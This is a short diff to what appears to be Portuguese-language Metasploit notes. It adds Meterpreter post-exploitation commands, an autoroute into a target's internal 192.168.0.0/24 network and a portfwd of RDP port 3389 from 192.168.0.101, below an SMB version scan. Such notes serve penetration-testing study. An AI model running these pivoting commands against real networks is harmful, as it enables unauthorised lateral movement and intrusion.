@@ -76,3 +76,9 @@ msf > use auxiliary/scanner/smb/smb_version
 msf > show options
 msf > set RHOSTS 172.16.1.5
 msf > run
+
+Criando rota da rede do alvo para a nossa máquina:
+meterpreter > run autoroute -s 192.168.0.0/24
+
+Criando redirecionamento de porta do alvo para a nossa máquina:
+meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.0.101
